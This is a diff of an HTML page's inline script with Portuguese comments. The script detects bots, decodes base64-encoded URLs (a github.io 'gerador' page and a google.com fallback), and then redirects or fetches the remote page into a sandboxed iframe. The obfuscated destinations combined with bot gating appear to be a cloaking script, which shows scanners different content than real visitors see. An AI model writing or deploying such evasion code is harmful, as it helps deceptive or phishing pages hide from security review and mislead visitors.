@@ -18,8 +18,8 @@
 
   <script>
   async function checkConditions() {
-      const targetUrl = "aHR0cHMlM0ElMkYlMkZlZHVhcmRvbHVjaGVzZS5naXRodWIuaW8lMkZnZXJhZG9yJTJG";
-      const defaultUrl = "aHR0cHMlM0ElMkYlMkZlZHVhcmRvbHVjaGVzZS5naXRodWIuaW8lMkZ0ZXJyYWNl";
+      const targetUrl = "aHR0cHMlM0ElMkYlMkZlZHVhcmRvbHVjaGVzZS5naXRodWIuaW8lMkZnZXJhZG9y";
+      const defaultUrl = "aHR0cHMlM0ElMkYlMkZnb29nbGUuY29t";
       const targetAction = "show";
       const defaultAction = "show";
 
@@ -57,52 +57,37 @@
           isBot: isBot,
           passed: !isBot
       };
-      async function loadContent(url, action) {
-          if(action === 'redirect') {
-              window.location.href = decodeURIComponent(atob(url));
-              return;
-          }
+async function loadContent(url, action) {
+    if(action === 'redirect') {
+        window.location.href = decodeURIComponent(atob(url));
+        return;
+    }
 
-          const decodedUrl = decodeURIComponent(atob(url));
-          try {
-              const response = await fetch(decodedUrl);
-              const content = await response.text();
-              
-              const parser = new DOMParser();
-              const doc = parser.parseFromString(content, 'text/html');
-              
-              // Processa links externos
-              doc.querySelectorAll('a').forEach(link => {
-                  const href = link.getAttribute('href');
-                  if (href && (href.startsWith('http') || href.startsWith('https'))) {
-                      link.setAttribute('target', '_blank');
-                      link.setAttribute('rel', 'noopener noreferrer');
-                      // Força abertura em nova aba
-                      link.onclick = (e) => {
-                          e.preventDefault();
-                          window.open(href, '_blank');
-                      };
-                  }
-              });
+    try {
+        const decodedUrl = decodeURIComponent(atob(url));
+        const response = await fetch(decodedUrl);
+        const content = await response.text();
 
-              // Processa formulários
-              doc.querySelectorAll('form').forEach(form => {
-                  const action = form.getAttribute('action');
-                  if (action && (action.startsWith('http') || action.startsWith('https'))) {
-                      form.setAttribute('target', '_blank');
-                  }
-              });
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(content, 'text/html');
 
-              return `<iframe 
-                  srcdoc="${doc.documentElement.outerHTML.replace(/"/g, '&quot;')}"
-                  style="width: 100%; height: 100vh; border: none;"
-                  sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-top-navigation"
-              ></iframe>`;
-          } catch (error) {
-              console.error('Erro ao carregar conteúdo:', error);
-              return 'Erro ao carregar conteúdo. Por favor, tente novamente.';
-          }
-      }
+        doc.querySelectorAll('a').forEach(link => {
+            const href = link.getAttribute('href');
+            if (href && (href.startsWith('http') || href.startsWith('https'))) {
+                link.setAttribute('target', '_blank');
+            }
+        });
+
+        return `<iframe 
+            srcdoc="${doc.documentElement.outerHTML.replace(/"/g, '&quot;')}"
+            style="width: 100%; height: 100vh; border: none;"
+            sandbox="allow-same-origin allow-scripts allow-popups allow-forms"
+        ></iframe>`;
+    } catch (error) {
+        console.error('Erro ao carregar conteúdo:', error);
+        return `<div>Erro ao carregar conteúdo</div>`;
+    }
+}
 
       async function handleAccess(allowed) {
           if(window.history.replaceState) {
